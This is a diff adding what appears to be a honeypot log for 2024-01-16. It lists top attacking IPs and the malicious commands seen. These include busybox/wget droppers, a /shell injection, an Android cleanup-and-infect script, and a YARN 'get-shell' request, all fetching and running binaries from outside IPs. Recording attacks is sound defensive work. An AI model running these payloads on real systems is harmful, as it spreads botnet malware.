@@ -1,0 +1,30 @@
+Top 5 IPs for 2024-01-16:
+
+1.1.145.150
+47.100.230.180
+92.124.132.235
+94.103.124.162
+211.224.208.91
+
+Malicious commands seen:
+cd /data/local/tmp/; busybox wget http://45.131.111.142/arm7; chmod 777 arm7; ./arm7 android
+
+GET /shell?cd+/tmp;rm+arm4+arm7;wget+http:/\\/45.131.111.142/arm7;chmod+777+arm7;./arm7+jaws;wget+http:/\\/45.131.111.142/arm4;chmod+777+arm4;./arm4+jaws HTTP/1.1
+Host: <HOST IP>
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: KrebsOnSecurity
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+
+pkill -9 -;pkill -9 arm;pkill -9 arm7; pkill -9 x86;pkill -9 x86_64;su 0 rm -rf /data/local;su 0 mkdir /data/local/;su 0 mkdir /data/local/tmp;su 0 chmod 777 /data/local;su 0 chmod 777 /data/local/tmp;chmod 777 /data/local/tmp; cd /data/local/tmp || cd /data/local/.most || cd /data/local/most; rm -rf *;su 0 iptables -F;setenforce 0;busybox wget http://103.28.32.56/and || su 0 busybox wget http://103.28.32.56/and;chmod 777 and || su 0 chmod 777 and;sh and;su 0 mv /data/local/tmp /data/local/.most;su 0 chmod 777 /data/local;su 0 echo hacker > /data/local/tmp;su 0 chmod 444 /data/local;ulimit 999999
+
+POST /ws/v1/cluster/apps HTTP/1.1
+Host: <OST IP>
+User-Agent: Hello World
+Accept: */*
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: 287\r\n\r\n{\"application-id\": \"\", \"application-name\": \"get-shell\", \"am-container-spec\": {\"commands\": {\"command\": \"cd /tmp; rm -rf skid.x86; wget http://45.95.147.172/skid.x86; curl http://45.95.147.172/skid.x86 --output skid.x86; chmod 777 skid.x86; ./skid.x86 Yarn;\"}}, \"application-type\": \"YARN\"}
